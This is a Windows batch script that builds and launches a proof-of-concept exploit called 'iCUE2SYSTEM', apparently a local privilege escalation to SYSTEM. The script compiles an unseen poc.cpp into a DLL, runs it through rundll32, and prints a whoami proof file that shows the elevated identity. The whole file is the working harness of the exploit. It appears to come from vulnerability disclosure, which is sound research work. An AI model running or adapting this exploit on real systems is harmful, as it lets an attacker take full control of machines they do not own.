@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "ROOT=%~dp0"
set "PROOF=%TEMP%\iCUE2SYSTEM\whoami.txt"
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"

del /q "%PROOF%" >nul 2>&1

if exist "%VSWHERE%" (
  for /f "usebackq delims=" %%I in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VSROOT=%%I"
  if defined VSROOT call "!VSROOT!\VC\Auxiliary\Build\vcvars64.bat" >nul
)
where cl.exe >nul 2>&1
if errorlevel 1 goto :no_compiler

pushd "%ROOT%" || goto :build_failed
del /q poc.dll poc.obj poc.lib poc.exp >nul 2>&1
cl /nologo /LD /std:c++17 /EHsc /O2 /DUNICODE /D_UNICODE poc.cpp /link Advapi32.lib winsqlite3.lib /OUT:poc.dll
set "BUILD_RC=!ERRORLEVEL!"
del /q poc.obj poc.lib poc.exp >nul 2>&1
popd
if not "%BUILD_RC%"=="0" goto :build_failed

rundll32.exe "%ROOT%poc.dll",Run
if exist "%PROOF%" (
  echo [iCUE2SYSTEM] SYSTEM identity proof:
  type "%PROOF%"
  exit /b 0
)
echo [iCUE2SYSTEM] Failed. No proof was written.
exit /b 1

:no_compiler
echo [iCUE2SYSTEM] Build failed: install Visual Studio Build Tools with the C++ and Windows SDK components.
exit /b 2

:build_failed
del /q "%ROOT%poc.dll" "%ROOT%poc.obj" "%ROOT%poc.lib" "%ROOT%poc.exp" >nul 2>&1
echo [iCUE2SYSTEM] Build failed.
exit /b 3
